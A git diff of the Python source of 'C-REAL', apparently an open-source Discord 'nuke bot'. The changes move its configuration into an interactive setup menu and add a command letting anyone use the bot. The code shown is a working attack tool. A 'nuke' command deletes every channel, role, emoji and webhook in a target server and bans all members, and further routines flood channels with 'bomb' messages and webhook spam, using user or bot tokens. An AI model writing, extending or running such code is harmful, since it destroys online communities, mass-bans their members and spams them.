@@ -27,32 +27,31 @@ Don't use the bot on real servers or use it to spam because this is breaking
 discord's ToS, and you will be resulted in an account deletion.
 """
 # discord
-try:
-    import discord, sys, requests, os, time
-    from discord.ext import commands
-    import asyncio
-    from packaging import version
-    from random import randint, choice, randrange, random
-    from threading import Thread
-    from queue import Queue
-    from io import BytesIO
-    from math import ceil
-    if sys.platform == 'linux':
-        import simplejson as json
-    else:
-        import json
-    # style
-    from colorama import init, Fore
-except Exception as e:
-    print(e)
-    exit()
+import discord, sys, requests, os, time
+from discord.ext import commands
+import asyncio
+from packaging import version
+from random import randint, choice, randrange, random, choices
+from threading import Thread
+from inputimeout import inputimeout, TimeoutOccurred
+from queue import Queue
+from io import BytesIO
+from pathlib import Path
+from math import ceil
+from copy import deepcopy
+if sys.platform == 'linux':
+    import simplejson as json
+else:
+    import json
+# style
+from colorama import init, Fore
 
 
 init(autoreset=True)
 
 # 
 __TITLE__ = "C-REAL"
-__VERSION__ = "2.3.2"
+__VERSION__ = "2.4.0"
 __AUTHOR__ = "TKperson"
 __LICENSE__ = "MIT"
 
@@ -70,7 +69,8 @@ auto_status = False
 selfbot_has_perm = False
 timeout = 6
 fetching_members = False
-
+bad_filename_map = dict((ord(char), None) for char in '<>:"\\/|?*')
+grant_all_permissions = False
 # normal functions==============
 def exit():
     try:
@@ -79,44 +79,8 @@ def exit():
         pass
     sys.exit(1)
 
-def readJson():
-    temp = None
-    from pathlib import Path
-    try:
-        if os.path.isfile(Path().absolute().__str__() + '/default.json'):
-            temp = json.load(open(Path().absolute().__str__() + '/default.json'))
-        else:
-            try:
-                print('Cannot find side-by-side default.json file for configuration. Try entering a full path or local path to the configuration file.')
-                uinput = input('Path: ')
-            except KeyboardInterrupt:
-                sys.exit(0)
-            except EOFError:
-                print('Invalid input/EOFError. This may be caused by some unicode.')
-                exit()
-
-            if os.path.isfile(uinput):
-                temp = json.load(open(uinput))
-            else:
-                print(f'{uinput} file doesn\'t exist.')
-                exit()
-
-    except json.decoder.JSONDecodeError:
-        print('Unreadable json formatting in the given configuration file. Make sure the formats are correct.')
-        exit()
-
-    for nonessential in ['bomb_messages', 'webhook_spam', 'after', 'proxies']:
-        if not nonessential in temp:
-            temp[nonessential] = None
-
-    try:
-        return temp['token'], temp['permissions'], temp['bomb_messages'], temp['webhook_spam'], str(temp['bot_permission']), temp['command_prefix'], temp['bot_status'], temp['verbose'], temp['after'], temp['proxies']
-    except KeyError as e:
-        print(f'Missing keys in the configuration file. {e} is missing.')
-        exit()
-
 def banner():
-    # Some consoles are **** so I don't know why they are so **** so so so so I used std::cout
+    """Handler for non-unicode consoles"""
     sys.stdout.buffer.write(f'''\
  ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
 ██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: {__VERSION__}
@@ -129,48 +93,149 @@ def banner():
 if version.parse('1.5.1') > version.parse(discord.__version__):
     print('Please update your discord.py.')
     exit()
-token, permissions, bomb_messages, webhook_spam, bot_permission, command_prefix, bot_status, verbose, after, proxies = readJson()
 
-want_log_request = want_log_console = want_log_message = want_log_errors = False
+settings = {"token":None,"permissions":[],"bot_permission":"2146958847","command_prefix":".","bot_status":"offline","verbose":15,"bomb_messages":{"random":None,"fixed":[]},"webhook_spam":{"usernames":[],"pfp_urls":[],"contents":[]},"after":[],"proxies":[],"ban_whitelist":[]}
 
-if verbose & 1 << 0:
-    want_log_request = True
-if verbose & 1 << 1:
-    want_log_console = True
-if verbose & 1 << 2:
-    want_log_message = True
-if verbose & 1 << 3:
-    want_log_errors = True
+def setUp():
+    # check location 
+    from glob import glob
+    config = None
+    config_parent_dir = os.path.join(Path().absolute().__str__(), 'data')
+    config_path = os.path.join(config_parent_dir, 'default.json')
+    json_paths = glob(os.path.join(Path().absolute().__str__(), 'data', '*.json'))
 
-def randomProxy(protocol):
-    # As long it works fine then i'm using this method
-    if proxies is None or len(proxies) == 0:
-        return None
-    return {protocol: choice(proxies)}
-is_selfbot = True
-try:
-    headers = {'authorization': token, 'content-type': 'application/json'}
-    print('Checking selfbot token.', end='\r')
-    if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', proxies=randomProxy('https'), timeout=timeout, headers=headers).json():
-        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
-        # Reading source codes is always a good thing :)
-        headers['authorization'] = 'Bot ' + token
-        print('Checking normal bot token.', end='\r')
-        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', proxies=randomProxy('https'), timeout=timeout, headers=headers).json():
-            print('Invalid token is being used.')
+    def getConfig(choice, timeout):
+        while True:
+            # it really doesn't matter if I use triple quotes or not.... the speed is going to be the same and doing this looks better
+            print('=========================')
+            print('|                       |')
+            print('| [{0}] Load default.json |'.format('1' if 1 in choice else 'x'))
+            print('| [{0}] Select .json file |'.format('2' if 2 in choice else 'x'))
+            print('| [{0}] Create a new json |'.format('3' if 3 in choice else 'x'))
+            print('|                       |')
+            print('=========================')
+            print('[x] = not Available;')
+            try:
+                response = inputimeout(prompt='Auto boot with choice [1] in %d seconds...\nChoose 1, 2, or 3\n>> ' % timeout, timeout=timeout)
+            except TimeoutOccurred:
+                response = '1'
+
+            if response == '1':
+                if not os.path.isfile(config_path):
+                    print(f'Unable to find file: {config_path}')
+                    continue
+
+                with open(config_path, 'r', encoding='utf8') as f:
+                    try:
+                        return json.loads(f.read())
+                    except json.decoder.JSONDecodeError:
+                        print(f'There are some errors occured when reading the configuration file. File path -> {config_path}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...')
+                break
+            elif response == '2':
+                while True:
+                    print('=========================')
+                    print('0) Go back')
+                    for i, path in enumerate(json_paths):
+                        print(f'{str(i+1)}) {path}')
+                    index = input('Select the .json file.\n>> ')
+
+                    if not index.isdigit() or not (0 <= (index := int(index)) <= len(json_paths)):
+                        print(f'You need to enter an integer that is between or on 0 and {str(len(json_paths))}')
+                        continue
+
+                    if index == 0:
+                        timeout = 999999
+                        break
+
+                    with open(json_paths[index-1], 'r', encoding='utf8') as f:
+                        try:
+                            return json.loads(f.read())
+                        except json.decoder.JSONDecodeError:
+                            print(f'There are some errors occured when reading the configuration file. File path -> {config_path}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...')
+
+            elif response == '3':
+                break
+
+    global settings, settings_copy
+    if os.path.isfile(config_path): # have default.json
+        config = getConfig([1,2,3], 5)
+    
+    elif len(json_paths) > 0: # dont have default.json but have other .json file
+        config = getConfig([2,3], 999999)
+
+    if config is not None:
+        settings.update(config)
+    else:
+        try:
+            from getpass import getpass
+            settings['token'] = getpass('Enter token. Note: Whatever you entered here will not be displayed.\n>> ')
+            settings['permissions'].append(input('\nEnter your discord tag or user ID. It is recommended to use discord user ID because same unicode names are hard for the code to check.\n>> '))
+        except KeyboardInterrupt:
+            sys.exit(0)
+        except EOFError:
+            print('Invalid input/EOFError. This may be caused by some unicode.')
             exit()
-        else:
-            is_selfbot = False
-except requests.exceptions.ProxyError:
-    print('Bad proxy is being used. You can try to change a proxy or restart the bot.')
-    exit()
-except requests.exceptions.ConnectTimeout:
-    print(f'Proxy reached maximum load time: timeout is {timeout} seconds long.')
-    exit()
-except requests.exceptions.ConnectionError:
-    raise
-    print('You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don\'t what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.')
-    exit()
+
+    print('\nTips:')
+    print('The default command_prefix is: .')
+    print(f'Your currect command_prefix is: {settings["command_prefix"]}')
+    print(f'Use {settings["command_prefix"]}config to config the settings and more info about how to config.\n')
+
+    settings_copy = deepcopy(settings)
+
+setUp()
+# token, permissions, bomb_messages, webhook_spam, bot_permission, command_prefix, bot_status, verbose, after, proxies = readJson()
+
+
+want_log_request = want_log_console = want_log_message = want_log_errors = 0
+
+def updateVerbose():
+    global want_log_request, want_log_console, want_log_message, want_log_errors
+    verbose = settings['verbose']
+    want_log_request = verbose & 1 << 0
+    want_log_console = verbose & 1 << 1
+    want_log_message = verbose & 1 << 2
+    want_log_errors  = verbose & 1 << 3
+updateVerbose()
+
+# def randomProxy(protocol):
+#     # As long it works fine then i'm using this method
+#     if proxies is None or len(proxies) == 0:
+#         return None
+#     return {protocol: choice(proxies)}
+
+is_selfbot = True
+headers = {}
+
+def checkToken(token=None):
+    if token is None:
+        token = settings['token']
+
+    global is_selfbot, headers 
+    try:
+        headers = {'authorization': token, 'content-type': 'application/json'}
+        print('Checking selfbot token.', end='\r')
+        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
+            # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
+            # Reading source codes is always a good thing :)
+            headers['authorization'] = 'Bot ' + token
+            print('Checking normal bot token.', end='\r')
+            if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', timeout=timeout, headers=headers).json():
+                print('Invalid token is being used.')
+                exit()
+            else:
+                is_selfbot = False
+    # except requests.exceptions.ProxyError:
+    #     print('Bad proxy is being used. You can try to change a proxy or restart the bot.')
+    #     exit()
+    # except requests.exceptions.ConnectTimeout:
+    #     print(f'Proxy reached maximum load time: timeout is {timeout} seconds long.')
+    #     exit()
+    except requests.exceptions.ConnectionError:
+        print('You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don\'t what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.')
+        exit()
+
+checkToken()
 
 ### check updates
 print('Checking update...           ', end='\r')
@@ -193,21 +258,27 @@ intents          - intents: :class:`Intents`
                         disabling and enabling certain gateway events from triggering and being sent.
                         If not given, defaults to a regularly constructed :class:`Intents` class.
 """
-client = commands.Bot(command_prefix=command_prefix, case_insensitive=True, self_bot=is_selfbot, intents=discord.Intents().all(), proxies=randomProxy('http'))
+
+async def determine_prefix(bot, message): # https://stackoverflow.com/questions/56796991/discord-py-changing-prefix-with-command
+    return settings['command_prefix']
+
+# client = commands.Bot(command_prefix=determine_prefix, case_insensitive=True, self_bot=is_selfbot, proxies=randomProxy('http'))
+client = commands.Bot(command_prefix=settings['command_prefix'], case_insensitive=True, self_bot=is_selfbot, intents=discord.Intents().all())
 client.remove_command('help')
+
 ######### Events #########
 @client.event
 async def on_connect():
     if is_selfbot:
-        for user in permissions:
+        for user in settings['permissions']:
             if str(client.user.id) == user or f'{client.user.name}#{client.user.discriminator}' == user:
                 global selfbot_has_perm
                 selfbot_has_perm = True
-        permissions.append(str(client.user.id))
+        settings['permissions'].append(str(client.user.id))
 
     global sorted_commands
     sorted_commands = sorted(client.commands, key=lambda e: e.name[0])
-    await changeStatus(None, bot_status)
+    await changeStatus(None, settings['bot_status'])
 
 @client.event
 async def on_ready():
@@ -218,27 +289,15 @@ async def on_ready():
     print(f'| | {client.user.name}#{client.user.discriminator}')
     print(f'| | {client.user.id}')
     print(f'| {Fore.MAGENTA}+ Permission given to ')
-    for permission in permissions:
+    for permission in settings['permissions']:
         print(f'| | {permission}')
-    print(f'| {Fore.MAGENTA}+ Bot prefix: ' + command_prefix)
+    print(f'| {Fore.MAGENTA}+ Command prefix: ' + settings['command_prefix'])
     if is_selfbot:
         print(f'| {Fore.YELLOW}+ [Selfbot] This is a selfbot. Join servers with join codes.')
     else:
-        print(f'| {Fore.YELLOW}+ https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')
+        print(f'| {Fore.YELLOW}+ https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={settings["bot_permission"]}&scope=bot')
     print('| ~*************************************')
     print('\\+-----')
-
-    # selected_server = client.guilds[1]
-    # channel = selected_server.channels[0]
-    # print(channel.name)
-
-    # done = channel.overwrites_for(client.user)
-    # print(dir(done))
-
-    # for i in dir(done):
-    #     print()
-
-    # print(done._values)
 
 
 @client.event
@@ -293,6 +352,10 @@ async def on_command_error(ctx, error):
     Error handlers
     It's always a good idea to look into the source code to find things that are hard to find on the internet.
     """
+
+    # Debug mode
+    # raise error
+
     if not want_log_errors or hasattr(ctx.command, 'on_error'):
         return
 
@@ -314,26 +377,6 @@ async def on_command_error(ctx, error):
 
     elif isinstance(error, discord.Forbidden):
         await log(ctx, f'403 Forbidden: Missing permission.')
-
-    elif isinstance(error, commands.BotMissingPermissions):
-        missing = [perm.replace('_', ' ').replace('guild', 'server').title() for perm in error.missing_perms]
-        if len(missing) > 2:
-            fmt = '{}, and {}'.format("**, **".join(missing[:-1]), missing[-1])
-        else:
-            fmt = ' and '.join(missing)
-        _message = 'I need the **{}** permission(s) to run this command.'.format(fmt)
-        await log(ctx, _message)
-    
-    elif isinstance(error, commands.MissingPermissions):
-        missing = [perm.replace('_', ' ').replace('guild', 'server').title() for perm in error.missing_perms]
-        if len(missing) > 2:
-            fmt = '{}, and {}'.format("**, **".join(missing[:-1]), missing[-1])
-        else:
-            fmt = ' and '.join(missing)
-        _message = 'You need the **{}** permission(s) to use this command.'.format(fmt)
-        await log(ctx, _message)
-    elif isinstance(error, commands.CommandInvokeError):
-        await log(ctx, 'Command invoke error')
     
     elif isinstance(error, discord.errors.HTTPException): # usually caused by sending over 2000 characters limit
         # has already been handled in "def log"
@@ -341,14 +384,6 @@ async def on_command_error(ctx, error):
 
     elif isinstance(error, commands.UserInputError):
         await log(ctx, 'Invalid input.')
-
-    elif isinstance(error, commands.MissingRequiredArgument):
-        if error.param.name == 'inp':
-            await log(ctx, 'You forgot to give me input to repeat!')
-
-    elif isinstance(error, commands.BadArgument):
-            if ctx.command.qualified_name == 'tag list':  # Check if the command being invoked is 'tag list'
-                await log(ctx, 'I could not find that member. Please try again.')
 
     else:
         # 'args', 'code', 'response', 'status', 'text', 'with_traceback'
@@ -361,12 +396,12 @@ async def on_command_error(ctx, error):
         except discord.errors.NotFound: # When ctx.channel is deleted 
             pass
         except TypeError: # When there's a charater that can't be logged into discord. Like if error.args contains a tuple which can't be automatically turned into a string.
-            consoleLog(f'{Fore.RED}Error -> {error.args}: {Fore.YELLOW}When to using "{ctx.message.content}".', True)
+            consoleLog(f'{Fore.RED}Error -> {error.args}: {Fore.YELLOW}When using "{ctx.message.content}".', True)
 
 if is_selfbot:
     @client.event
     async def on_message(message):
-        if message.content.startswith(command_prefix) and checkPerm(await client.get_context(message)):
+        if message.content.startswith(settings["command_prefix"]) and checkPerm(await client.get_context(message)):
             if message.author.id == client.user.id and not selfbot_has_perm:
                 consoleLog(f'{Fore.YELLOW}Account owner {Fore.LIGHTBLUE_EX}"{client.user.name}#{client.user.discriminator}" {Fore.YELLOW}tried to use {Fore.LIGHTBLUE_EX}"{message.content}"{Fore.BLUE}. Too bad, he/she doesn\'t of the power to use this bot.', True)
                 return
@@ -392,6 +427,15 @@ def isDM(ctx):
     # return False # in server            
 
 def nameIdHandler(name):
+    """
+    <@! ID > = pinging user
+    <@& ID > = pinging role
+
+    Usage - remove the brakets around the ID
+
+    return - the ID
+    """
+
     if name.startswith('<@!') or name.startswith('<@&'):
         return name[:-1][3:]
     return name
@@ -431,43 +475,40 @@ async def embed(ctx, n, title, array):
         names += f'{item.name}\n'
         ids += f'{str(item.id)}\n '
 
-    if not isDM(ctx) and 1 << 11 & selected_server.me.guild_permissions.value == 0 and (selected_server is None or ctx.guild.id == selected_server.id):
+    # if not isDM(ctx) and 1 << 11 & selected_server.me.guild_permissions.value == 0 and (selected_server is None or ctx.guild.id == selected_server.id):
+    #     names = names.split('\n')
+    #     ids = ids.split(' ')
+    #     consoleLog(f'\n{Fore.GREEN}*{title}*\n{Fore.RESET}Total count: {Fore.YELLOW}{str(item_length)}\n{Fore.GREEN}__Name__{" " * 13}{Fore.CYAN}__ID__\n{ "".join([(Fore.GREEN + names[i].ljust(21) + Fore.CYAN + ids[i]) for i in range(len(names) - 1)]) }{Fore.YELLOW}{n+1}/{str(ceil(item_length / per_page))}', True)
+    # else:
+    try:
+        theColor = randint(0, 0xFFFFFF)
+        embed = discord.Embed(
+            title = title,
+            description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
+            color = theColor
+        )
+        embed.add_field(name='Name', value=names, inline=True)
+        embed.add_field(name='ID', value=ids, inline=True)
+        embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}')
+        await ctx.send(embed=embed)
+    except:
         names = names.split('\n')
         ids = ids.split(' ')
-        consoleLog(f'\n{Fore.GREEN}*{title}*\n{Fore.RESET}Total count: {Fore.YELLOW}{str(item_length)}\n{Fore.GREEN}__Name__{" " * 13}{Fore.CYAN}__ID__\n{ "".join([(Fore.GREEN + names[i].ljust(21) + Fore.CYAN + ids[i]) for i in range(len(names) - 1)]) }{Fore.YELLOW}{n+1}/{str(ceil(item_length / per_page))}', True)
-    else:
-        try:
-            theColor = randint(0, 0xFFFFFF)
-            embed = discord.Embed(
-                title = title,
-                description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
-                color = theColor
-            )
-            embed.add_field(name='Name', value=names, inline=True)
-            embed.add_field(name='ID', value=ids, inline=True)
-            embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}')
-            await ctx.send(embed=embed)
-        except:
-            names = names.split('\n')
-            ids = ids.split(' ')
-            await ctx.send(f'```*{title}*\nTotal count: {str(item_length)}\n__Name__{" " * 13}__ID__\n{ "".join([(names[i].ljust(21) + ids[i]) for i in range(len(names) - 1)]) }{n+1}/{str(ceil(item_length / per_page))}```')
+        await ctx.send(f'```*{title}*\nTotal count: {str(item_length)}\n__Name__{" " * 13}__ID__\n{ "".join([(names[i].ljust(21) + ids[i]) for i in range(len(names) - 1)]) }{n+1}/{str(ceil(item_length / per_page))}```')
 
 async def hasTarget(ctx):
     """
     Checking if there's a selected server for using the comands.
     """
-    # if not 1 << 11 & value:
-    #     consoleLog('No permission to send message')
-    #     return
 
     if selected_server is not None:
         return True
     elif not isDM(ctx):
         await connect(ctx)
-        await log(ctx, f'You have been automatically `{command_prefix}connect` to server `{selected_server.name}` because you are not connected to a server and using a command inside a server.')
+        await log(ctx, f'You have been automatically `{settings["command_prefix"]}connect` to server `{selected_server.name}` because you are not connected to a server and using a command inside a server.')
         return True
     else:
-        await log(ctx, f'I am not connected to a server. Try `{command_prefix}servers` and `{command_prefix}connect`')
+        await log(ctx, f'I am not connected to a server. Try `{settings["command_prefix"]}servers` and `{settings["command_prefix"]}connect`')
         return False
 
 def containing(a, b):
@@ -477,7 +518,10 @@ def containing(a, b):
     return None
 
 def checkPerm(ctx):
-    for user in permissions:
+    if grant_all_permissions:
+        return True
+
+    for user in settings['permissions']:
         if str(ctx.author.id) == user or f'{ctx.author.name}#{ctx.author.discriminator}' == user:
             return True
     if not isDM(ctx):
@@ -487,15 +531,15 @@ def checkPerm(ctx):
     return False
 
 def fixedChoice():
-    return bomb_messages['fixed'][randint(0, len(bomb_messages['fixed']) - 1)]
+    return settings['bomb_messages']['fixed'][randint(0, len(settings['bomb_messages']['fixed']) - 1)]
 
 base64_char = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
-def random_b64():
-    return ''.join(choice(base64_char) for _ in range(bomb_messages['random']))
+def random_b64(n=0):
+    return ''.join(choices(base64_char, k=settings['bomb_messages']['random'] if n == 0 else n))
 
 alphanum = '0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 def random_an():
-    return ''.join(choice(alphanum) for _ in range(bomb_messages['random']))
+    return ''.join(choices(alphanum, k=settings['bomb_messages']['random']))
 
 def sendMessagePerm(ctx):
     pass
@@ -506,6 +550,10 @@ def checkTalkPerm(ctx):
         return True
 
     # return calcPerm(ctx, ) and 16384 & ctx.channel.
+
+def configIsSaved():
+    # global settings_copy, settings # idk why python did this but after adding this for my 3.8.5 python it works
+    return settings_copy == settings
 
 # class discordMember:
 #     def __init__(self, name, id_, discriminator=None, channel_id=None):
@@ -534,11 +582,11 @@ async def help(ctx, asked_command=None):
     if asked_command is None:
         for command in sorted_commands:
             help_list += f'[{command.name}] '
-        await ctx.send(help_list + f'\n\nYou can try {command_prefix}help <command> to see all the aliases for the command. Or read the manual.md for more infomation about the commands.```')
+        await ctx.send(help_list + f'\n\nYou can try {settings["command_prefix"]}help <command> to see all the aliases for the command. Or read the manual.md for more infomation about the commands.```')
     else:
         for command in sorted_commands:
             if asked_command.lower() == command.name.lower():
-                help_command = f'```{command_prefix}<{command.name}'
+                help_command = f'```{settings["command_prefix"]}<{command.name}'
                 for aliase in command.aliases:
                     help_command += f'|{aliase}'
                 help_command += '>'
@@ -621,7 +669,7 @@ async def members(ctx, command='1', *, args=None):
     #         args = args.split()
 
     #         if not is_selfbot:
-    #             await log(ctx, f'Fetch command is only made for selfbot; since you are using normal bots, all members in the server `{selected_server.name}` has already be fetched. Try `{command_prefix}members` to see all the fetched members.')
+    #             await log(ctx, f'Fetch command is only made for selfbot; since you are using normal bots, all members in the server `{selected_server.name}` has already be fetched. Try `{settings["command_prefix"]}members` to see all the fetched members.')
     #             return
 
     #         if args[0].lower() == 'auto':
@@ -652,7 +700,7 @@ async def members(ctx, command='1', *, args=None):
     #         if args[1].lower() == 'fast':
     #             fetching_members = True
     #             url = f'https://discord.com/api/v8/channels/{channel_id}/messages?limit=100'
-    #             await log(ctx, f'```Fetching has started.\nCheck progress: `{command_prefix}members`\nStop fetching: `{command_prefix}members fetch stop`.\nCooldown: `{cooldown}` seconds.\nNote: duplicated users will only get removed after the fetching stops.```')
+    #             await log(ctx, f'```Fetching has started.\nCheck progress: `{settings["command_prefix"]}members`\nStop fetching: `{settings["command_prefix"]}members fetch stop`.\nCooldown: `{cooldown}` seconds.\nNote: duplicated users will only get removed after the fetching stops.```')
     #             while fetching_members:
     #                 r = requests.get(url, headers=headers, proxies=randomProxy('https'), timeout=timeout).json()
     #                 if len(r) == 0:
@@ -672,7 +720,7 @@ async def members(ctx, command='1', *, args=None):
     #                     await asyncio.sleep(cooldown)
 
     #         elif args[1].lower() == 'all':
-    #             await log(ctx, f'```Fetching has started.\nCheck progress: `{command_prefix}members`\nStop fetching: `{command_prefix}members fetch stop`.\nCooldown: `{cooldown}` seconds.\nNote: duplicated users will only get removed after the fetching stops.```')
+    #             await log(ctx, f'```Fetching has started.\nCheck progress: `{settings["command_prefix"]}members`\nStop fetching: `{settings["command_prefix"]}members fetch stop`.\nCooldown: `{cooldown}` seconds.\nNote: duplicated users will only get removed after the fetching stops.```')
     #             pass
     #         else:
     #             await log(ctx, 'You need to choose a fetching operation. Options are `all` or `fast`.')
@@ -1024,19 +1072,34 @@ async def disableCommunityMode(ctx):
     if not await hasTarget(ctx):
         return
 
-    if is_selfbot:
-        headers = {'authorization': f'{token}', 'content-type': 'application/json'}
-    else:
-        headers = {'authorization': f'Bot {token}', 'content-type': 'application/json'}
-    json = {"description": None, "features": {"0": "NEWS"}, "preferred_locale": "en-US", "public_updates_channel_id": None, 'rules_channel_id': None}
-
     try:
-        consoleLog(f'{Fore.YELLOW}Disabling community mode', True)
-        r = requests.patch(f'https://discord.com/api/v8/guilds/{selected_server.id}', headers=headers, json=json)
-        consoleLog(f'{Fore.GREEN}Disabled community mode.', True)
+        await log(ctx, f'{Fore.YELLOW}Disabling community mode')
+        r = requests.patch(f'https://discord.com/api/v8/guilds/{selected_server.id}', headers=headers, json=
+            {'description': None, 'features': {'0': 'NEWS'}, 
+            'preferred_locale': 'en-US', 
+            'public_updates_channel_id': None, 'rules_channel_id': None})
+
+        consoleLog(f'Disabling cummunity mode response -> {r.text}', True)
+
+        await log(ctx, f'{Fore.GREEN}Disabled community mode.')
+
     except Exception as e:
         consoleLog(f'{Fore.RED}Error while attempting to disable community mode, {e}', True)
-                           
+        raise
+
+@commands.check(checkPerm)
+@client.command(name='grantAllPerm', aliases=['gap'])
+async def grantAllPerm(ctx):
+    global grant_all_permissions
+
+    if grant_all_permissions:
+        await log(ctx, 'Now only people with permissions can use the commands.')
+        grant_all_permissions = False
+    else:
+        await log(ctx, 'Now everyone can use the bot commands')
+        grant_all_permissions = True
+
+
 ######### Bombs #########
 @commands.check(checkPerm)
 @client.command(name='kaboom')
@@ -1059,8 +1122,9 @@ def requestMaker():
     while True:
         requesting, url, headers, payload = q.get()
         try:
-            proxy = randomProxy('https')
-            r = requesting(url, data=json.dumps(payload), headers=headers, proxies=proxy, timeout=timeout)
+            # proxy = randomProxy('https')
+            # r = requesting(url, data=json.dumps(payload), headers=headers, proxies=proxy, timeout=timeout)
+            r = requesting(url, data=json.dumps(payload), headers=headers, timeout=timeout)
             if r.status_code == 429:
                 r = r.json()
                 if want_log_request:
@@ -1076,11 +1140,11 @@ def requestMaker():
                 consoleLog('Request cancelled due to -> ' + r['message'])
         except json.decoder.JSONDecodeError:
             pass
-        except requests.exceptions.ProxyError:
-            consoleLog(f'Proxy "{proxy}" did not respond to a request. Trying...')
-            q.put((requesting, url, headers, payload))
+        # except requests.exceptions.ProxyError:
+        #     consoleLog(f'Proxy "{proxy}" did not respond to a request. Trying...')
+        #     q.put((requesting, url, headers, payload))
         except requests.exceptions.ConnectTimeout:
-            consoleLog(f'Proxy reached maximum load time: timeout is {timeout} seconds long {proxy}')
+            consoleLog(f'Reached maximum load time: timeout is {timeout} seconds long {proxy}')
             q.put((requesting, url, headers, payload))
         except Exception as e:
             consoleLog(f'Unexpected error: {str(e)}')
@@ -1236,8 +1300,8 @@ async def webhook(ctx, *, args=None):
             raise
     args = args.split()
     if args[0] == 'create' or args[0] == 'add': # webhook create
-        global headers
-        args.pop(0)
+        # global headers
+        del args[0]
         if len(args) < 1:
             await log(ctx, f'More arguments is requested. You can put how many webhooks you want to create or channel id/name on the channels you want the webhooks to be created on.')
             return
@@ -1248,7 +1312,7 @@ async def webhook(ctx, *, args=None):
 
         channels = name.split()
         if int(name) < 0:
-            await log(ctx, f'A smol negative number will break this bot?')
+            await log(ctx, f'You thought a smol negative number will break this bot?')
             return
 
         if len(channels) == 1 and int(name) <= 50: ## probably will replace this with auto check channel id
@@ -1257,7 +1321,7 @@ async def webhook(ctx, *, args=None):
                 await log(ctx, f'This adding webhooks method can only distribute webhooks evenly and randomly throughout the text channels. You entered `{name}`, and there are only `{str(len(channels))}` text channel(s) in the server. If you don\'t what to add more text channels. You can use this command a few more times with a positive integer that is less than `{str(len(channels) + 1)}`.')
                 return
             for i in range(int(name)):
-                payload = {'name': random_b64()}
+                payload = {'name': random_b64(10)}
                 q.put((requests.post, f'https://discord.com/api/v8/channels/{channels.pop(randrange(len(channels))).id}/webhooks', headers, payload))
             q.join()
             await log(ctx, f'`{name}` webhooks has been created.')
@@ -1269,8 +1333,9 @@ async def webhook(ctx, *, args=None):
                 if checked_channel is None:
                     await log(ctx, f'Cannot find channel {channel}.')
                     continue
-                payload = {'name': random_b64()}
+                payload = {'name': random_b64(10)}
                 q.put((requests.post, f'https://discord.com/api/v8/channels/{checked_channel.id}/webhooks', headers, payload))
+    
     elif args[0] == 'delete' or args[0] == 'remove':
         name = args[1]
 
@@ -1296,7 +1361,7 @@ async def webhook(ctx, *, args=None):
             elif args[0] == 'start':
                 target_list_length = len(webhook_targets)
                 if target_list_length == 0:
-                    await log(ctx, f'Looks like there really isn\'t any targets in the attack list. Maybe try: `{command_prefix}webhook attack all`, then `{command_prefix}webhook attack start <number of messages>`.')
+                    await log(ctx, f'Looks like there really isn\'t any targets in the attack list. Maybe try: `{settings["command_prefix"]}webhook attack all`, then `{settings["command_prefix"]}webhook attack start <number of messages>`.')
                     return
                 _headers = {
                     'content-type': 'application/json'
@@ -1308,15 +1373,15 @@ async def webhook(ctx, *, args=None):
                     await log(ctx, 'Please enter a positive integer.')
                     return
                 
-                usernames_length = len(webhook_spam['usernames'])
-                contents_length = len(webhook_spam['contents'])
-                pfp_length = len(webhook_spam['pfp_urls'])
+                usernames_length = len(settings['webhook_spam']['usernames'])
+                contents_length = len(settings['webhook_spam']['contents'])
+                pfp_length = len(settings['webhook_spam']['pfp_urls'])
                  
                 for i in range(int(args[1])):
                     payload = {
-                        'username': choice(webhook_spam['usernames']),
-                        'content': choice(webhook_spam['contents']),
-                        'avatar_url': choice(webhook_spam['pfp_urls'])
+                        'username': choice(settings['webhook_spam']['usernames']),
+                        'content': choice(settings['webhook_spam']['contents']),
+                        'avatar_url': choice(settings['webhook_spam']['pfp_urls'])
                     }
                     q.put((requests.post, webhook_targets[randrange(target_list_length)].url, _headers, payload))
             
@@ -1359,23 +1424,21 @@ async def nuke(ctx):
         return
 
     await log(ctx, f'A nuke has been launched to `{selected_server.name}`.')
-    tasks = [disableCommunityMode(ctx), deleteAllChannels(ctx), deleteAllEmojis(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx)]
+    tasks = [deleteAllChannels(ctx), deleteAllEmojis(ctx), deleteAllRoles(ctx), banAll(ctx), deleteAllWebhooks(ctx)]
     await asyncio.gather(*tasks)
 
-    if len(after) > 0:
-        if selected_server.id == ctx.guild.id: ## this will still cause an id not found error: fix this later
+    if len(settings['after']) > 0:
+        if not isDM(ctx) and selected_server.id == ctx.guild.id:
             ctx.message.channel = None 
 
         consoleLog(f'{Fore.BLUE}Running after commands...', True)
-        for command in after:
+        for command in settings['after']:
             # Lol im so smart to think something like this would work
             try:
-                ctx.message.content = command_prefix + command
